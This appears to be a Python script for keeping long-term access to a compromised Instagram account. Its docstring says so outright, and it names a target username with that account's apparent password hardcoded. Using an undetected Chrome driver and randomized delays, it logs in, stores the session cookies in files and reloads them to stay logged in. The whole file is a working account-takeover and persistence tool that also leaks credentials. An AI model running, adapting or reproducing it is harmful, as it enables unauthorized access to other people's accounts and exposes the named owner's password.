#!/usr/bin/env python3
"""
🔐 INSTAGRAM SESSION PERSISTENCE MANAGER
Maintains long-term access to compromised account
Target: alx.trading | Password: Fleming654
"""

import json
import time
import random
import sys
import os
from datetime import datetime, timedelta
import pickle
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
import undetected_chromedriver as uc

def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
        sys.stdout.flush()
    except (BrokenPipeError, IOError):
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, sys.stdout.fileno())
        sys.exit(1)

class InstagramSessionManager:
    def __init__(self, username="alx.trading", password="Fleming654"):
        self.username = username
        self.password = password
        self.session_file = f"instagram_session_{username}.pkl"
        self.cookies_file = f"instagram_cookies_{username}.json"
        self.driver = None
        
    def save_session(self, driver):
        """Save browser session and cookies"""
        try:
            # Save cookies
            cookies = driver.get_cookies()
            session_data = {
                "cookies": cookies,
                "user_agent": driver.execute_script("return navigator.userAgent;"),
                "timestamp": datetime.now().isoformat(),
                "username": self.username,
                "current_url": driver.current_url
            }
            
            with open(self.cookies_file, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            # Save session state
            with open(self.session_file, 'wb') as f:
                pickle.dump(session_data, f)
            
            safe_print(f"💾 Session saved to {self.session_file}")
            safe_print(f"🍪 Cookies saved to {self.cookies_file}")
            return True
            
        except Exception as e:
            safe_print(f"❌ Session save failed: {e}")
            return False
    
    def load_session(self, driver):
        """Load saved session into browser"""
        try:
            if not os.path.exists(self.cookies_file):
                safe_print("⚠️ No saved session found")
                return False
            
            with open(self.cookies_file, 'r') as f:
                session_data = json.load(f)
            
            # Check if session is not too old (24 hours)
            session_time = datetime.fromisoformat(session_data["timestamp"])
            if datetime.now() - session_time > timedelta(hours=24):
                safe_print("⚠️ Session expired (>24 hours)")
                return False
            
            # Load cookies
            driver.get("https://www.instagram.com/")
            time.sleep(2)
            
            for cookie in session_data["cookies"]:
                try:
                    driver.add_cookie(cookie)
                except:
                    continue
            
            # Refresh to apply cookies
            driver.refresh()
            time.sleep(3)
            
            # Verify session is valid
            if "login" not in driver.current_url:
                safe_print("✅ Session restored successfully")
                return True
            else:
                safe_print("⚠️ Session invalid - login required")
                return False
                
        except Exception as e:
            safe_print(f"❌ Session load failed: {e}")
            return False
    
    def create_persistent_session(self):
        """Create new session with persistence"""
        try:
            safe_print("🔧 Creating persistent session...")
            
            options = uc.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            
            self.driver = uc.Chrome(options=options)
            
            # Try to load existing session first
            if self.load_session(self.driver):
                safe_print("✅ Existing session loaded")
                return self.driver
            
            # Login fresh if no valid session
            safe_print("🔐 Creating new session...")
            self.driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(random.uniform(3, 5))
            
            # Login
            username_field = self.driver.find_element(By.NAME, "username")
            password_field = self.driver.find_element(By.NAME, "password")
            
            username_field.send_keys(self.username)
            time.sleep(random.uniform(1, 2))
            password_field.send_keys(self.password)
            time.sleep(random.uniform(1, 2))
            
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            
            time.sleep(random.uniform(5, 8))
            
            if "login" not in self.driver.current_url:
                safe_print("✅ Fresh session created")
                self.save_session(self.driver)
                return self.driver
            else:
                safe_print("❌ Session creation failed")
                return None
                
        except Exception as e:
            safe_print(f"❌ Session creation error: {e}")
            return None
    
    def verify_session_health(self):
        """Check if current session is healthy"""
        try:
            if not self.driver:
                return False
                
            # Try to access profile page
            self.driver.get(f"https://www.instagram.com/{self.username}/")
            time.sleep(3)
            
            if "login" in self.driver.current_url:
                safe_print("⚠️ Session expired - login required")
                return False
            
            safe_print("✅ Session is healthy")
            return True
            
        except Exception as e:
            safe_print(f"⚠️ Session health check failed: {e}")
            return False

def main():
    """Execute session persistence management"""
    manager = InstagramSessionManager()
    
    # Create persistent session
    driver = manager.create_persistent_session()
    
    if driver:
        safe_print("✅ Persistent session established")
        safe_print("💾 Session saved for future use")
        driver.quit()
    else:
        safe_print("❌ Failed to establish persistent session")

if __name__ == "__main__":
    main()
